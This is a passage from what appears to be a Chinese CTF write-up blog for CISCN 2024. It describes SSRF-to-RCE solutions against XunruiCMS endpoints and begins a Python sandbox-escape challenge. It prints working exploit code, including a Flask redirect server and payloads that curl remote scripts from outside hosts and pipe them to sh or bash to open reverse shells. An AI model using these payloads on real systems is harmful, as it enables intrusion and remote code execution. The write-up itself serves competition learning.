            <span class="token variable">$logo_width</span> <span class="token operator">=</span> <span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$logo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//logo图片宽度</span>
            <span class="token variable">$logo_height</span> <span class="token operator">=</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$logo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//logo图片高度</span>
            <span class="token variable">$logo_qr_width</span> <span class="token operator">=</span> <span class="token variable">$QR_width</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span>
            <span class="token variable">$scale</span> <span class="token operator">=</span> <span class="token variable">$logo_width</span> <span class="token operator">/</span> <span class="token variable">$logo_qr_width</span><span class="token punctuation">;</span>
            <span class="token variable">$logo_qr_height</span> <span class="token operator">=</span> <span class="token variable">$logo_height</span> <span class="token operator">/</span> <span class="token variable">$scale</span><span class="token punctuation">;</span>
            <span class="token variable">$from_width</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$QR_width</span> <span class="token operator">-</span> <span class="token variable">$logo_qr_width</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token comment">//重新组合图片并调整大小</span>
            <span class="token function">imagecopyresampled</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">,</span> <span class="token variable">$logo</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$from_width</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$from_width</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_qr_width</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_qr_height</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_width</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$logo_height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
 
    <span class="token comment">// 输出图片</span>
    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ob_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$QR</span> <span class="token operator">&amp;&amp;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$QR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240519171837522.png" alt="image-20240519171837522"></p>
<p>就单纯把hostname换成了ip，但是内网穿透的那个ip不能直接访问80端口。。。wdnmd</p>
<p>（后日谈：这个好像是官方网站的源码）</p>
<p>但是最要命的是这里：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http'</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'follow_location'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$newUrl</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这样一来我们就不能用 302 了, 但是我们还有办法：</p>
<p>在上一题中这里是</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$thumb</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>getimagesize</code> 似了, 我们还有 <code>dr_catcher_data</code> </p>
<p>只是我们要保证靶机第一次访问的时候，也就是调用 file_get_contents 的时候，我们得返回正常的图片</p>
<p>即绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$img</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'此图片不是一张可用的图片'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>只有这样，靶机才能调用 <code>dr_catcher_data</code> ，进行第二次访问，由于第二次访问还是不会检测 302 的，就可以 getshell</p>
<p>exp：起python服务，直接curl <a target="_blank" rel="noopener" href="https://reverse-shell.sh/">https://reverse-shell.sh</a>来弹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect
 
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
 
Flag<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> Flag
    <span class="token keyword">if</span> Flag<span class="token punctuation">:</span>
        Flag<span class="token operator">=</span><span class="token boolean">False</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D3mo.jpg'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/flag.php?cmd=curl https://reverse-shell.sh/115.236.153.172:13314 | sh"</span><span class="token punctuation">)</span>
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">777</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload：需要重复打两次才能弹shell</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>text<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//76135132qk.imdo.co/</span>
<span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>text<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//76135132qk.imdo.co/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240530004601422.png" alt="image-20240530004601422"></p>
<p>此解法适用于ctfshow的靶机</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240530004928044.png" alt="image-20240530004928044"></p>
<p>实际没改，估计只是弹shell上的问题</p>
<hr>
<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>思路来源于boogipop</p>
<p>前面也是扫出来个Readme.txt，给了我们官方的下载地址：<a target="_blank" rel="noopener" href="https://www.xunruicms.com/down/">https://www.xunruicms.com/down/</a></p>
<p>然后发现在官方下的建站版源码比github上的源码东西还要多！</p>
<p>于是思路就变成了再挖一个洞，官方下载地址的源码里面还多了一个File.php存在控制器可以被触发</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240529103403617.png" alt="image-20240529103403617"></p>
<p>但是<code>down</code>方法的开头依旧会进行鉴权，所以不可用</p>
<p>注意到刚才的File.php里有一个找远程图片的方法<code>down_img</code></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240529105803683.png" alt="image-20240529105803683"></p>
<p>这里也有鉴权，但是我们本地调试的时候设两个变量跟一下看看</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240529235240107.png" alt="image-20240529235240107"></p>
<p>发现这里的值都是空值，不会触发拦截，所以能绕过鉴权</p>
<p>至于ssrf点具体在哪里，跟了半天也不知道。。</p>
<p>payload：用curl来弹shell</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>file<span class="token operator">&amp;</span>m<span class="token operator">=</span>down_img

value<span class="token operator">=</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string double-quoted-string">"http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh"</span> alt<span class="token operator">=</span><span class="token string double-quoted-string">"Example Image"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因为ctfshow的复现环境存在鉴权，所以那边的预期解实际不可行！</p>
<hr>
<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>有说法是图片头检测，直接加个图片头即可：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 设置响应头，指定内容类型为 GIF 图片</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 输出最小的 GIF89a 图片</span>
<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 刷新缓冲区并立即发送输出</span>
<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 等待一秒钟以确保浏览器接收到图片</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 发送 302 重定向头</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php?cmd=curl%20124.221.19.214:1314/poc1.html|bash"</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 终止脚本执行</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是ctfshow的环境打不出来</p>
<hr>
<h2 id="mossfern-复现"><a href="#mossfern-复现" class="headerlink" title="mossfern (复现)"></a>mossfern (复现)</h2><blockquote>
<p>python沙箱栈帧逃逸</p>
</blockquote>
<p>我前阵子刚学的栈帧逃逸啊。。。知道思路但是不会做</p>
<p>main.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify
<span class="token keyword">from</span> uuid <span class="token keyword">import</span> uuid1

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

runner <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/app/runner.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/run"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> request<span class="token punctuation">.</span>json
        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>
            runner<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"THIS_IS_SEED"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"THIS_IS_TASK_RANDOM_ID"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        run <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
            <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
            timeout<span class="token operator">=</span><span class="token number">3</span>
        <span class="token punctuation">)</span>
        result <span class="token operator">=</span> run<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        error <span class="token operator">=</span> run<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> error<span class="token punctuation">)</span>
        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>error<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.py"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">.txt"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"None"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>runner.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">source_simple_check</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Check the source with pure string in string, prevent dangerous strings
    :param source: source code
    :return: None
    """</span>

    <span class="token keyword">from</span> sys <span class="token keyword">import</span> exit
    <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token keyword">print</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        source<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> UnicodeEncodeError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"non-ascii is not permitted"</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token string">"getattr"</span><span class="token punctuation">,</span> <span class="token string">"exit"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token keyword">in</span> source<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">block_wrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Check the run process with sys.audithook, no dangerous operations should be conduct
    :return: None
    """</span>

    <span class="token keyword">def</span> <span class="token function">audit</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>

        <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token keyword">print</span>
        <span class="token keyword">import</span> os

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"marshal"</span><span class="token punctuation">,</span> <span class="token string">"__new__"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"sys"</span><span class="token punctuation">,</span> <span class="token string">"interpreter"</span><span class="token punctuation">,</span> <span class="token string">"cpython"</span><span class="token punctuation">,</span> <span class="token string">"open"</span><span class="token punctuation">,</span> <span class="token string">"compile"</span><span class="token punctuation">,</span> <span class="token string">"gc"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span>event <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> s <span class="token keyword">in</span> args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> audit


<span class="token keyword">def</span> <span class="token function">source_opcode_checker</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Check the source in the bytecode aspect, no methods and globals should be load
    :param code: source code
    :return: None
    """</span>

    <span class="token keyword">from</span> dis <span class="token keyword">import</span> dis
    <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span>
    <span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO
    <span class="token keyword">from</span> sys <span class="token keyword">import</span> exit

    opcodeIO <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    dis<span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>opcodeIO<span class="token punctuation">)</span>
    opcode <span class="token operator">=</span> opcodeIO<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
    opcodeIO<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> opcode<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"LOAD_GLOBAL"</span><span class="token punctuation">,</span> <span class="token string">"IMPORT_NAME"</span><span class="token punctuation">,</span> <span class="token string">"LOAD_METHOD"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"randint"</span><span class="token punctuation">,</span> <span class="token string">"randrange"</span><span class="token punctuation">,</span> <span class="token string">"print"</span><span class="token punctuation">,</span> <span class="token string">"seed"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"LOAD_GLOBAL"</span><span class="token punctuation">,</span> <span class="token string">"IMPORT_NAME"</span><span class="token punctuation">,</span> <span class="token string">"LOAD_METHOD"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>

    <span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">open</span>
    <span class="token keyword">from</span> sys <span class="token keyword">import</span> addaudithook
    <span class="token keyword">from</span> contextlib <span class="token keyword">import</span> redirect_stdout
    <span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token punctuation">,</span> randrange<span class="token punctuation">,</span> seed
    <span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO
